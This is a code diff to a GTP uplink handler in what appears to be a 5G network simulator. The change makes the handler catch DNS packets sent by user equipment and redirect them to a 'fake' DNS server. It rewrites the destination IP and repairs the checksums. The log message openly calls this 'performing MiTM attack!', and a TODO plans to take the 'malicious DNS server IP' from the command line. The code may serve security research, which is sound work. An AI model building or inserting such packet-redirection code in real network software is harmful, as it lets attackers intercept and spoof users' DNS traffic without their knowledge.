@@ -130,30 +130,20 @@ void GtpTask::handleUplinkData(int ueId, int psi, OctetString &&pdu)
     struct in_addr src_ip_addr;
     src_ip_addr.s_addr = p.ip->iph_sourceip;
 
-    m_logger->debug("Uplink IP Protocol: %d", (int)p.ip->iph_protocol);
-    m_logger->debug("Uplink UDP Destination Port: %d", (int)(ntohs(p.udp->udph_destport)));
-
-    if (std::string(inet_ntoa(src_ip_addr)) != "0.0.0.0" && p.ip->iph_protocol == (u_char)11 && p.udp->udph_destport == (ushort)53)
+    if (std::string(inet_ntoa(src_ip_addr)) != "0.0.0.0" && (int)p.ip->iph_protocol == 17 && (int)(ntohs(p.udp->udph_destport)) == 53)
     {
-        m_logger->debug("DNS packet received from UE[%d]", ueId);
-        // (1) Display the unmodified packet assuming it is not sent internally from 0.0.0.0
-        m_logger->debug("Original Outgoing PDU:");
-        for (int i = 0; i < pdu.length(); i++)
-            printf("%02x ", data[i]);
-        printf("\n");
+        m_logger->debug("DNS packet received from UE[%d], performing MiTM attack!", ueId);
 
+        // MiTM attack
+        // TODO: command line defined malicious DNS server IP
         std::string fake_dns_ip = "8.8.4.4";
-        m_logger->debug("Changing packet dest IP to %s", fake_dns_ip.c_str());
+        m_logger->debug("Changing packet destination IP to [%s]", fake_dns_ip.c_str());
         utils::set_dest_ip(&p, fake_dns_ip);
 
+        // Fix integrity checks
+        // For DNS, we need to fix IP and UDP checksums
         m_logger->debug("Applying checksums to packet");
         utils::apply_checksums(&p, pdu.length());
-
-        // print the uint_8 array
-        m_logger->debug("Modified Outgoing PDU:");
-        for (int i = 0; i < pdu.length(); i++)
-            printf("%02x ", data[i]);
-        printf("\n");
     }
 
     // ignore non IPv4 packets
